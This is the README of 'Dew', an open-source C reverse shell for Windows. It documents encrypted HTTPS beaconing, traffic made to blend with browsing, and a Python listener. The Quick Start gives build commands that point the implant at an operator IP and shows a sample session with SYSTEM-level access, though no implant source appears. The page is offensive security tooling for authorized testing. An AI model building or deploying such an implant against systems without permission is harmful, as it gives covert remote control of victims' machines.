<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-light.svg">
  <img alt="Dew" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Dew/main/docs/assets/logo-dark.svg" width="520">
</picture>

![C](https://img.shields.io/badge/language-C-orange.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Encrypted HTTPS reverse shell -- XChaCha20-Poly1305 over TLS, ~37 KB binary, zero dependencies.**

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Features

### XChaCha20-Poly1305

AEAD encryption with vendored Monocypher extraction (~370 lines). 24-byte random nonces via `RtlGenRandom`. Wire format: `[nonce(24)][mac(16)][ciphertext]`. Fresh nonce per message.

### HTTPS Transport

Native WinHTTP with TLS on port 443. System proxy support. Chrome User-Agent. Standard HTTPS that blends with normal browsing traffic.

### Small Binary (~37 KB)

Stripped and size-optimized with `-Os -s`. No runtime dependencies beyond native Windows DLLs. Cross-compiled from Linux with MinGW-w64.

### Zero Dependencies

WinHTTP and advapi32 are native Windows libraries. Monocypher is vendored and compiled in. Nothing to install on the target.

### Interactive Listener

Python 3 HTTPS server with interactive prompt. Auto-generated self-signed TLS certs. PyNaCl for matching XChaCha20-Poly1305 decrypt/encrypt. Thread-safe command queue.

---

## Quick Start

```bash
# Clone and build (generates random PSK, compiles, prints listener command)
git clone https://github.com/Real-Fruit-Snacks/Dew.git
cd Dew
./build.sh 10.10.14.1 443

# Or specify your own 256-bit key
./build.sh 10.10.14.1 443 <64-char-hex>
```

```bash
# Start listener (build.sh prints this command with your key)
python3 listener.py --lport 443 --key <psk>

# Deploy dew.exe to target, then interact
dew> whoami
nt authority\system
```

---

## Architecture

```
[Target]                          [Operator]
 dew.exe  ──── HTTPS/TLS ────>  listener.py
          <── encrypted cmd ───
          ── encrypted output ─>
```

| Layer | Implementation |
|-------|----------------|
| **Transport** | WinHTTP with native TLS, system proxy support |
| **Encryption** | XChaCha20-Poly1305 (Monocypher), pre-shared key |
| **Wire Format** | `[nonce(24)][mac(16)][ciphertext]`, fresh nonce per message |
| **Beacon** | Encrypted check-in via `POST /poll`, jittered with `RtlGenRandom` |

---

## Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `LHOST` | `127.0.0.1` | Listener IP/domain |
| `LPORT` | `443` | Listener port |
| `KEY` | Random 256-bit | Pre-shared key (64 hex chars) |
| `SLEEP_BASE` | `5` | Polling interval in seconds |
| `JITTER_PCT` | `30` | Jitter percentage (centered) |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Dew/security/advisories). Do not open public issues for security bugs.

**Dew does not:** evade kernel-level monitoring (ETW), bypass AMSI, provide persistence, exfiltrate data outside the command channel, or hide WinHTTP connections from process monitors.

---

## License

[MIT](LICENSE) -- Copyright 2026 Real-Fruit-Snacks
